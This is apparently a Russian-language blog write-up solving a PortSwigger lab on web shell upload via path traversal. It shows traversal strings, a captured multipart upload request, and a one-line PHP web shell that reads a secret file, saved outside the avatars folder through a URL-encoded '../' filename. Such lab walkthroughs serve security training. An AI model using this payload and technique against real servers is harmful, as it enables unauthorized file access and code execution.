---
title: "Web shell upload via path traversal"
date: 2025-08-07
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/preventing-file-execution-in-user-accessible-directories/file-upload/lab-file-upload-web-shell-upload-via-path-traversal"
classes: wide
---

В данной лабе содержится **уязвимость в загрузке файлов**. Для ее прохождения нужно получить доступ к файлу `/home/carlos/secret` и передать его содержимое в форму проверки.

Для входа в аккаунт можно использовать креды `wiener`:`peter`.

```
https://0a07003d03613f59817b5c9400e9003a.web-security-academy.net/
```

## Solution

Зайду в личный кабинет с кредами из задания:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/1.png){: height="200" .align-center}

Тут есть возможность загрузить картинку, воспользуюсь ей.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/2.png){: height="200" .align-center}

Открою картинку в отдельном окне.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/3.png){: height="200" .align-center}

Пришла идея, что я могу получить доступ к нужному файлу с помощью **Path Traversal** уязвимости. Попробую через `URL` получить файл:

```
../../../home/carlos/secret
../../../../home/carlos/secret
```

Ничего не получилось( Посмотрю в другом месте. Гляну `POST`-запрос к серверу:

```http
POST /my-account/avatar HTTP/2
Host: 0a07003d03613f59817b5c9400e9003a.web-security-academy.net
Cookie: session=7E7K4PEvnIiGMnYLxrlYcBAoSNOt5YJJ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a07003d03613f59817b5c9400e9003a.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundary6640f312240f713049159f0d6197d925
Content-Length: 107749
Origin: https://0a07003d03613f59817b5c9400e9003a.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary6640f312240f713049159f0d6197d925
Content-Disposition: form-data; name="avatar"; filename="dog.jpg"
Content-Type: image/jpeg
```

Тут есть интересное поле `Content-Disposition: form-data;`. Это значит, что через поле `filename` я могу передать путь для сохранения моего файла. Проверю, могу ли я сохранить другой формат файла. Из контекста прошлых лаб попробую загрузить `PHP` файл со следующим содержимым:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Файл успешно загрузился на сайт, но не выполнился. 

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/4.png){: height="200" .align-center}

Попробую изменить путь для сохранения файла на `../exploit.php`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/5.png){: height="200" .align-center}

Видно, что путь до файла не изменился. Закодирую его в `URL`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/6.png){: height="200" .align-center}

Получилось) Теперь я могу получить нужный файл. По пути `files/avatars/../exploit.php`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/7.png){: height="200" .align-center}

Сдам полученный токен для прохождения лабы.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_path_traversal/8.png){: height="200" .align-center}